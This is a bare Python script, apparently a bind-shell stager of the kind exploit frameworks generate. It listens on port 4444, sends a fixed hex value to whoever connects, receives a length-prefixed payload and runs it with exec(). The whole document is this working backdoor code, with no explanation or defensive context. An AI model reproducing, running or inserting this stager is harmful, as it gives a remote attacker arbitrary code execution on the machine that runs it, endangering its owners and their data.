import socket,struct
b=socket.socket(2,socket.SOCK_STREAM)
b.bind(('0.0.0.0',4444))
b.listen(1)
s,a=b.accept()
import binascii
s.send(binascii.a2b_hex('309b2154a8d5a588eb8cfe98b567c11a'))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})